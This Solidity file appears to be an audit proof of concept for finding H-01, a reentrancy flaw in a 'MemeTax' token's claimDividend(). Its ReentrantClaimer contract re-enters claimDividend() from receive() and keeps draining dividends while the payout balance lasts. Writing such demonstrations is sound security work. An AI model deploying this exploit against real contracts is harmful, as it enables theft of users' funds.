// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {MemeTax} from "../../src/MemeTax.sol";

/// @notice Proof-of-concept attacker for H-01.
/// @dev `claimDividend()` sends ETH before zeroing the balance, so every
///      re-entrant call still reads the attacker's original entitlement.
contract ReentrantClaimer {
    MemeTax public immutable token;
    uint256 public reentries;

    constructor(MemeTax _token) {
        token = _token;
    }

    function attack() external {
        token.claimDividend();
    }

    receive() external payable {
        uint256 share = token.pendingDividend(address(this));
        if (share > 0 && address(token).balance >= share) {
            reentries++;
            token.claimDividend();
        }
    }
}
